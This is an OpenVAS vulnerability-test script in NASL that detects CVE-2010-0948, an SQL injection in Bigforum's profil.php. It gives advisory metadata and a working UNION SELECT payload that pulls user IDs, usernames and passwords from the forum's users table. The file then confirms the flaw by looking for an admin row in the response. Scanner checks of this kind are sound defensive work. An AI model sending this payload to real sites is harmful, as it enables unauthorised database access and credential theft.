##############################################################################
# OpenVAS Vulnerability Test
#
# Bigforum 'profil.php' SQL Injection Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801151");
  script_version("2022-05-02T09:35:37+0000");
  script_tag(name:"last_modification", value:"2022-05-02 09:35:37 +0000 (Mon, 02 May 2022)");
  script_tag(name:"creation_date", value:"2010-03-18 15:44:57 +0100 (Thu, 18 Mar 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-0948");
  script_name("Bigforum 'profil.php' SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/38872");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38597");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/56723");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/11646");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/1003-exploits/bigforum-sql.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"The flaw exists in 'profil.php'. Input passed to the 'id'
  parameter is not properly sanitised before being used in SQL queries.
  A remote attacker can execute arbitrary SQL commands.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Bigforum is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary SQL statements on the vulnerable system, which may lead to view,
  add, modify data, or delete information in the back-end database.

  NOTE: Successful exploitation requires that 'magic_quotes_gpc' is disabled.");

  script_tag(name:"affected", value:"Bigforum version 4.5 and prior");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/bigforum", "/bf", "/" , http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/index.php", port:port);

  if(">Bigforum" >< res)
  {
    ## Send an exploit and receive the response
    req = http_get(item:string(dir, "/profil.php?id=-1'+union+select+1," +
                      "concat(0x3a3a3a,id,0x3a,username,0x3a,pw,0x3a3a3a)," +
                      "3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22," +
                      "23,24,25,26,27,28,29+from+users+--+"), port:port);
    res = http_keepalive_send_recv(port:port, data:req);

    if((res =~ ":::.:admin:"))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
